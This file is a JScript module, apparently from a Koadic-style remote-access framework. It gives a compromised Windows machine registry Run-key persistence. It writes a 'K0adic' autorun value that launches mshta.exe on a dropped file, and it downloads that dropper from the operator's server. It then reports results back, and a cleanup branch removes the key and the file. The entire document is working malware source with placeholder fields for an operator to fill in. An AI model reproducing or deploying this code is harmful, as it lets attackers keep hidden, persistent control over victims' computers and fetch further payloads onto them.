try
{
    var headers = {};
    var path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    var droppath = entypreter.file.getPath("~FDROPDIR~\\~FDROPFILE~");
    var key = "K0adic";

    if (~CLEANUP~)
    {
        headers["Task"] = "DeleteKey";
        var hkey = ~FHKEY~;
        var hkeyname = "";
        switch(hkey)
        {
            case 0x80000001:
                hkeyname = "HKCU";
                break;
            case 0x80000002:
                hkeyname = "HKLM";
                break;
            default:
                break;
        }
        var retval = entypreter.shell.exec("reg delete "+hkeyname+"\\"+path+" /v "+key+" /f", "~DIRECTORY~\\"+entypreter.uuid()+".txt");
        entypreter.work.report(retval, headers);
        headers["Task"] = "DeleteDropper";
        entypreter.file.deleteFile(droppath);
        entypreter.work.report(entypreter.FS.FileExists(droppath).toString()+"~~~"+droppath, headers);
    }
    else
    {
        entypreter.registry.write(~FHKEY~, path, key, "C:\\Windows\\system32\\mshta.exe "+droppath, entypreter.registry.STRING);
        headers["Task"] = "AddKey";
        var retval = entypreter.registry.read(~FHKEY~, path, key, entypreter.registry.STRING).SValue;
        entypreter.work.report(retval, headers);

        headers["X-UploadFileJob"] = "true";
        entypreter.http.downloadEx("POST", entypreter.work.make_url(), headers, droppath);
        headers["X-UploadFileJob"] = "false";
        headers["Task"] = "AddDropper";
        entypreter.work.report(entypreter.FS.FileExists(droppath).toString()+"~~~"+droppath, headers);
    }

    entypreter.work.report("Complete");

}
catch (e)
{
    entypreter.work.error(e);
}

entypreter.exit();
